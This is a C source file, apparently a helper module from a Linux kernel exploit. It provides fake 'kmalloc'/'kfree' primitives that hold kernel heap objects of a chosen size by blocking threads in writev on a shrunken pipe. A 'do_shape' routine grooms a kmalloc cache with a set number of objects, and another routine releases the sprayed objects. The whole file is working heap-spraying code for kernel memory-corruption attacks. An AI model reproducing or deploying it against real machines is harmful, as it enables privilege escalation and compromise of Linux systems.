#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <pthread.h>
#include <signal.h>

#include "utils.h"

#define __NR_writev 20

struct memory_management {
	int pipefd[2];
	char *page;
	pthread_t tid;
} mm;

void handle_sigpipe(int sig) {}

void *__kmalloc(void *x) {
	size_t size = (size_t)x;
	if (size < 16) die("kmalloc wrong size");
	size = size >> 4;
	struct iovec io[size];
	FOR(i, size) {
		io[i].iov_base = mm.page;
		io[i].iov_len = 4096 * 2;
	}
	syscall(__NR_writev, mm.pipefd[1], io, size);
	return NULL;
}

void kmalloc(size_t size) {
	if ( pthread_create(&mm.tid, NULL, __kmalloc, (void *)size) < 0) die("pthread_create Failed");
	
}

void kfree() {
	read(mm.pipefd[0], mm.page, 4096);
}



void setup_memory_management(void) {
	if ( pipe(mm.pipefd) < 0) die("pipe failed");
	if ( fcntl(mm.pipefd[0], F_SETPIPE_SZ, 4096) != 4096) die("set pipe size failed");
	mm.page = mmap(NULL, 4096 * 2, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if (mm.page == MAP_FAILED) die("mmap failed");
	note("%s page : %p", __func__, mm.page);
	signal(SIGPIPE, handle_sigpipe);
}

void do_shape(size_t size, unsigned int count) {
	in();
	note("shaping kmalloc-%u cache with %u object...", size, count);
	FOR(i, count) {
		kmalloc(size);
	}
	note("Done");
	out();
}

void release_kernel_heap() {
	close(mm.pipefd[0]);
	close(mm.pipefd[1]);
	if ( pipe(mm.pipefd) < 0) die("pipe failed");
	if ( fcntl(mm.pipefd[0], F_SETPIPE_SZ, 4096) != 4096) die("set pipe size failed");
}
